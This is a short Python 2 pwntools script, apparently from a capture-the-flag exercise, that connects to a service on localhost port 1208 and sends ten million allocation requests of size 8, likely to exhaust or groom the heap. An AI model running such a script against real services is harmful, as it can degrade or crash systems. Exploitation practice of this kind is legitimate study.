from pwn import *

p = remote('localhost', 1208)


def alloc(size):
    p.send(p8(1))
    p.send(p8(size))

for i in range(10000000):
    if i % 10000 == 0:
        print i
    alloc(8)

